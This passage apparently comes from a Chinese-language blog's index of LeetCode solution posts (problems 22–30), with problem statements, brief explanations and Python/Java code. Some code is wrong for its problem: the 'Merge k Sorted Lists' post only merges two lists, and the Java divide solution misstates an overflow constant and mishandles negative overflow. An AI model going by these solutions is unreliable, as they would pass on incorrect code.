class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># 如果下一个单词不在words中，那么清空该dict，把前指针直接跳到后指针处</span></span><br><span class="line">                curr_dict.clear()</span><br><span class="line">                left = right</span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Hash Table </tag>
            
            <tag> Two Pointers </tag>
            
            <tag> String </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[29. Divide Two Integers]]></title>
      <url>/wiki/2017/10/30/Leetcode-29-Divide-Two-Integers/</url>
      <content type="html"><![CDATA[<p>Given two integers <code>dividend</code> and <code>divisor</code>, divide two integers without using multiplication, division and mod operator.</p>
<p>Return the quotient after dividing <code>dividend</code> by <code>divisor</code>.</p>
<p>The integer division should truncate toward zero.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: dividend = 10, divisor = 3</span><br><span class="line">Output: 3</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: dividend = 7, divisor = -3</span><br><span class="line">Output: -2</span><br></pre></td></tr></table></figure>
<p>Note:</p>
<ul>
<li>Both <code>dividend</code> and <code>divisor</code> will be 32-bit signed integers.</li>
<li>The <code>divisor</code> will never be 0.</li>
<li>Assume we are dealing with an environment which could only store integers within the 32-bit signed integer range: [$−2^{31},  2^{31}−1$]. For the purpose of this problem, assume that your function returns $2^{31}−1$ when the division result overflows.</li>
</ul>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>找到除，最快的方法是使用二分查找，从0开始寻找到被除数。题目要求不能用乘除法，在使用二分查找的时候，使用加法循环达到乘法的效果。需要注意符号和溢出的问题。溢出的话，只有一种情况，就是-2146483648/-1这种情况，直接判断好了。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">divide</span><span class="params">(<span class="keyword">int</span> dividend, <span class="keyword">int</span> divisor)</span> </span>&#123;</span><br><span class="line">       <span class="comment">// overflow</span></span><br><span class="line">       <span class="keyword">if</span> (dividend == Integer.MIN_VALUE &amp;&amp; divisor == -<span class="number">1</span>) &#123;</span><br><span class="line">           <span class="keyword">return</span> Integer.MAX_VALUE;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       <span class="keyword">int</span> flag = <span class="number">1</span>;</span><br><span class="line">       <span class="comment">// dividend &lt; 0</span></span><br><span class="line">       <span class="keyword">if</span> (dividend &lt; <span class="number">0</span>) &#123;</span><br><span class="line">           dividend = - dividend;</span><br><span class="line">           flag = - flag;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">// divisor &lt; 0</span></span><br><span class="line">       <span class="keyword">if</span> (divisor &lt; <span class="number">0</span>) &#123;</span><br><span class="line">           divisor = - divisor;</span><br><span class="line">           flag = -flag;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">int</span> lo = <span class="number">0</span>, hi = dividend;</span><br><span class="line">       <span class="keyword">while</span> (lo &lt;= hi) &#123;</span><br><span class="line">           <span class="keyword">int</span> mid = (lo + hi) &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">           <span class="keyword">int</span> cmp = - dividend;</span><br><span class="line">           <span class="comment">// 计算 mid * divisor</span></span><br><span class="line">           <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; mid; i++) &#123;</span><br><span class="line">               cmp += divisor;</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">if</span> (cmp &lt; <span class="number">0</span>) lo = mid + <span class="number">1</span>;</span><br><span class="line">           <span class="keyword">else</span> <span class="keyword">if</span> (cmp &gt; <span class="number">0</span>) hi = mid - <span class="number">1</span>;</span><br><span class="line">           <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">if</span> (flag == -<span class="number">1</span>)</span><br><span class="line">                   <span class="keyword">return</span> -mid;</span><br><span class="line">               <span class="keyword">return</span> mid;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (flag == - <span class="number">1</span>)</span><br><span class="line">           <span class="keyword">return</span> <span class="number">1</span> - lo;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> lo - <span class="number">1</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Math </tag>
            
            <tag> Binary Search </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[28. Implement strStr()]]></title>
      <url>/wiki/2017/10/30/Leetcode-28-Implement-strStr/</url>
      <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>[Easy]</p>
<p>Implement strStr().</p>
<p>Return the index of the first occurrence of needle in haystack, or -1 if needle is not part of haystack.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: haystack = &quot;hello&quot;, needle = &quot;ll&quot;</span><br><span class="line">Output: 2</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: haystack = &quot;aaaaa&quot;, needle = &quot;bba&quot;</span><br><span class="line">Output: -1</span><br></pre></td></tr></table></figure>
<h2 id="中文题目"><a href="#中文题目" class="headerlink" title="中文题目"></a>中文题目</h2><p>实现字符串子串匹配函数strStr()。如果字符串A是字符串B的子串，则返回A在B中首次出现的地址，否则返回-1。</p>
<p>实际应用中常用KMP算法，但是比较复杂。</p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>brute-force: 一一比对</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strStr</span><span class="params">(self, haystack, needle)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> needle == <span class="string">""</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(haystack)-len(needle)+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(needle)):</span><br><span class="line">            <span class="keyword">if</span> haystack[i+j] != needle[j]:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> j == len(needle)<span class="number">-1</span>:</span><br><span class="line">                <span class="keyword">return</span> i</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span></span><br></pre></td></tr></table></figure>
<p>也可借用python直接对比</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">strStr</span><span class="params">(self, haystack, needle)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type haystack: str</span></span><br><span class="line"><span class="string">        :type needle: str</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(haystack) - len(needle)+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> haystack[i:i+len(needle)] == needle:</span><br><span class="line">                <span class="keyword">return</span> i</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span></span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Two Pointers </tag>
            
            <tag> String </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[27. Remove Element]]></title>
      <url>/wiki/2017/10/30/Leetcode-27-Remove-Element/</url>
      <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>[Easy]</p>
<p>Given an array and a value, remove all instances of that value in-place and return the new length.</p>
<p>Do not allocate extra space for another array, you must do this by modifying the input array in-place with O(1) extra memory.</p>
<p>The order of elements can be changed. It doesn’t matter what you leave beyond the new length.</p>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Given nums = [3,2,2,3], val = 3,</span><br><span class="line"></span><br><span class="line">Your function should return length = 2, with the first two elements of nums being 2.</span><br></pre></td></tr></table></figure>
<h2 id="中文题目"><a href="#中文题目" class="headerlink" title="中文题目"></a>中文题目</h2><p>删除一个数组中某一特定数值的元素，返回删除后的数组长度。<br>注意点：操作结束后的数字排列顺序不需要与之前相同, 超出返回长度的部分不需要处理</p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>太简单了，不解释</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">removeElement</span><span class="params">(self, nums, val)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :type val: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line">        n = len(nums)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">            <span class="keyword">if</span> nums[i] != val:</span><br><span class="line">                nums[count] = nums[i]</span><br><span class="line">                count += <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> count</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[26. Remove Duplicates from Sorted Array]]></title>
      <url>/wiki/2017/10/30/Leetcode-26-Remove-Duplicates-from-Sorted-Array/</url>
      <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>[Easy]</p>
<p>Given a sorted array, remove the duplicates in-place such that each element appear only once and return the new length.</p>
<p>Do not allocate extra space for another array, you must do this by modifying the input array in-place with $O(1)$ extra memory.</p>
<p>Example:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Given nums = [1,1,2],</span><br><span class="line"></span><br><span class="line">Your function should return length = 2, with the first two elements of nums being 1 and 2 respectively.</span><br><span class="line">It doesn&apos;t matter what you leave beyond the new length.</span><br></pre></td></tr></table></figure></p>
<h2 id="中文题目"><a href="#中文题目" class="headerlink" title="中文题目"></a>中文题目</h2><p>从一个有序的数组中去除重复的数字，返回处理后的数组长度。</p>
<p>注意点：只能用常量的额外空间, 将不重复的数字移到数组前部，剩余的部分不需要处理</p>
<p>例子：</p>
<p>输入: nums = [1, 1, 2] 输出: 2</p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>因为去重的是一个已经排好序的数组，所以有重复的数据一定在一起，遍历数组，判断当前数据是否有重复，有重复将重复的数据用后面的数据覆盖</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">removeDuplicates</span><span class="params">(self, nums)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        n = len(nums)</span><br><span class="line">        <span class="keyword">if</span> n &lt; <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> n</span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, n):</span><br><span class="line">            <span class="keyword">if</span> nums[i] != nums[count]:</span><br><span class="line">                count += <span class="number">1</span></span><br><span class="line">                nums[count] = nums[i]</span><br><span class="line">        <span class="keyword">return</span> count+<span class="number">1</span></span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Array </tag>
            
            <tag> Two Pointers </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[25. Reverse Nodes in k-Group]]></title>
      <url>/wiki/2017/10/30/Leetcode-25-Reverse-Nodes-in-k-Group/</url>
      <content type="html"><![CDATA[<p>Given a linked list, reverse the nodes of a linked list $k$ at a time and return its modified list.</p>
<p>$k$ is a positive integer and is less than or equal to the length of the linked list. If the number of nodes is not a multiple of $k$ then left-out nodes in the end should remain as it is.</p>
<p>You may not alter the values in the nodes, only nodes itself may be changed.</p>
<p>Only constant memory is allowed.</p>
<p><strong>Example</strong>:</p>
<p>Given this linked list: <code>1-&gt;2-&gt;3-&gt;4-&gt;5</code></p>
<p>For $k = 2$, you should return: <code>2-&gt;1-&gt;4-&gt;3-&gt;5</code></p>
<p>For $k = 3$, you should return: <code>3-&gt;2-&gt;1-&gt;4-&gt;5</code></p>
<p>Note:</p>
<ul>
<li>Only constant extra memory is allowed.</li>
<li>You may not alter the values in the list’s nodes, only nodes itself may be changed.</li>
</ul>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>一种直接的方法就是对每$k$个元素，依次进行反转，反转的方法可以参考LeetCode-Q206ReverseLinkedList.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">reverseKGroup</span><span class="params">(ListNode head, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ((head==<span class="keyword">null</span>) || (head.next == <span class="keyword">null</span>) || (k == <span class="number">1</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">    ListNode pos = head;</span><br><span class="line">    ListNode cur;</span><br><span class="line">    ListNode prev;</span><br><span class="line">    ListNode next;</span><br><span class="line">    ListNode last = head;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// find the length of the linked list</span></span><br><span class="line">    <span class="keyword">int</span> len;</span><br><span class="line">    <span class="keyword">for</span> (len = <span class="number">1</span>; pos.next!= <span class="keyword">null</span>; len++) pos = pos.next;</span><br><span class="line"></span><br><span class="line">    pos = head;</span><br><span class="line">    <span class="comment">// reverse</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len/k; i++) &#123;</span><br><span class="line">        cur = pos.next;</span><br><span class="line">        prev = pos;</span><br><span class="line">        <span class="comment">// reverse each k nodes</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; k-<span class="number">1</span>; j++) &#123;</span><br><span class="line">            next = cur.next;</span><br><span class="line">            cur.next = prev;</span><br><span class="line">            prev = cur;</span><br><span class="line">            cur = next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">0</span>) &#123;</span><br><span class="line">            head = prev;</span><br><span class="line">        &#125;  <span class="keyword">else</span> &#123;</span><br><span class="line">            last.next = prev;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        last = pos;</span><br><span class="line">        pos.next = cur;</span><br><span class="line">        pos = cur;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reverseKGroup</span><span class="params">(self, head, k)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    :type head: ListNode</span></span><br><span class="line"><span class="string">    :type k: int</span></span><br><span class="line"><span class="string">    :rtype: ListNode</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="comment"># 特殊情况</span></span><br><span class="line">    <span class="keyword">if</span> k &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> head</span><br><span class="line">    </span><br><span class="line">    newhead = ListNode(<span class="number">0</span>)</span><br><span class="line">    newhead.next =  head</span><br><span class="line">    results = newhead</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        </span><br><span class="line">        before = newhead</span><br><span class="line">        <span class="comment"># 前进k步</span></span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line">        tmp = []</span><br><span class="line">        <span class="keyword">while</span> newhead.next  <span class="keyword">and</span> count &lt; k:</span><br><span class="line">            newhead = newhead.next</span><br><span class="line">            tmp.append(newhead)</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 判断退出条件</span></span><br><span class="line">        <span class="keyword">if</span> count != k:</span><br><span class="line">            <span class="keyword">return</span> results.next</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 反转</span></span><br><span class="line">        after = newhead.next</span><br><span class="line">        tmp[<span class="number">0</span>].next = after</span><br><span class="line">        before.next = tmp[k<span class="number">-1</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> reversed(range(<span class="number">1</span>, k)):</span><br><span class="line">            tmp[i].next = tmp[i<span class="number">-1</span>]</span><br><span class="line">        newhead = tmp[<span class="number">0</span>]</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> results.next</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Linked List </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[24. Swap Nodes in Pairs]]></title>
      <url>/wiki/2017/10/30/Leetcode-24-Swap-Nodes-in-Pairs/</url>
      <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Given a linked list, swap every two adjacent nodes and return its head.</p>
<p>For example,<br>Given <code>1-&gt;2-&gt;3-&gt;4</code>, you should return the list as <code>2-&gt;1-&gt;4-&gt;3</code>.</p>
<p>Your algorithm should use only constant space. You may not modify the values in the list, only nodes itself can be changed.</p>
<h2 id="中文题目"><a href="#中文题目" class="headerlink" title="中文题目"></a>中文题目</h2><p>将链表中相邻的两个节点交换位置，注意第一个节点与第二个节点要交换位置，而第二个节点不用与第三个节点交换位置。</p>
<p>例子： 输入: <code>head = 1-&gt;2-&gt;3-&gt;4</code> 输出: <code>2-&gt;1-&gt;4-&gt;3</code></p>
<p>不允许修改节点的值, 且只能用常量的额外空间</p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"># class ListNode(object):</span></span><br><span class="line"><span class="comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="comment">#         self.val = x</span></span><br><span class="line"><span class="comment">#         self.next = None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">swapPairs</span><span class="params">(self, head)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type head: ListNode</span></span><br><span class="line"><span class="string">        :rtype: ListNode</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        newhead = ListNode(<span class="number">0</span>)</span><br><span class="line">        newhead.next = head</span><br><span class="line">        results = newhead</span><br><span class="line">        <span class="keyword">while</span> newhead.next <span class="keyword">and</span> newhead.next.next:</span><br><span class="line">            </span><br><span class="line">            before = newhead</span><br><span class="line">            first = newhead.next</span><br><span class="line">            second = first.next</span><br><span class="line">            after = second.next</span><br><span class="line">            </span><br><span class="line">            before.next = second</span><br><span class="line">            second.next = first</span><br><span class="line">            first.next = after</span><br><span class="line">            </span><br><span class="line">            newhead = newhead.next.next</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> results.next</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Linked List </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[23. Merge k Sorted Lists]]></title>
      <url>/wiki/2017/10/30/Leetcode-23-Merge-k-Sorted-Lists/</url>
      <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Merge $k$ sorted linked lists and return it as one sorted list. Analyze and describe its complexity.</p>
<h2 id="中文题目"><a href="#中文题目" class="headerlink" title="中文题目"></a>中文题目</h2><p>将$k$个有序的链表拼接成一个有序的链表。</p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>为了避免分类讨论，添加一个假的头节点。现在只需要两个指针分别指向原来的两个链表，将其中比较小的节点添加到新的链表中。传入的参数l1和l2正好可以当作遍历两个链表的指针。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"># class ListNode:</span></span><br><span class="line"><span class="comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="comment">#         self.val = x</span></span><br><span class="line"><span class="comment">#         self.next = None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mergeTwoLists</span><span class="params">(self, l1, l2)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type l1: ListNode</span></span><br><span class="line"><span class="string">        :type l2: ListNode</span></span><br><span class="line"><span class="string">        :rtype: ListNode</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        </span><br><span class="line">        temp = ListNode(<span class="number">-1</span>)</span><br><span class="line">        head = temp</span><br><span class="line">        <span class="keyword">while</span> l1 <span class="keyword">and</span> l2:</span><br><span class="line">            <span class="keyword">if</span> l1.val &lt; l2.val:</span><br><span class="line">                temp.next = l1</span><br><span class="line">                l1 = l1.next</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                temp.next = l2</span><br><span class="line">                l2 = l2.next</span><br><span class="line">            temp = temp.next</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> l1:</span><br><span class="line">            temp.next = l1</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> l2:</span><br><span class="line">            temp.next = l2</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> head.next</span><br></pre></td></tr></table></figure>
<p>Your runtime beats 100.00 % of python3 submissions.</p>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Linked List </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[22. Generate Parentheses]]></title>
      <url>/wiki/2017/10/30/Leetcode-22-Generate-Parentheses/</url>
      <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Given $n$ pairs of parentheses, write a function to generate all combinations of well-formed parentheses.</p>
<p>For example, given $n = 3$, a solution set is:</p>
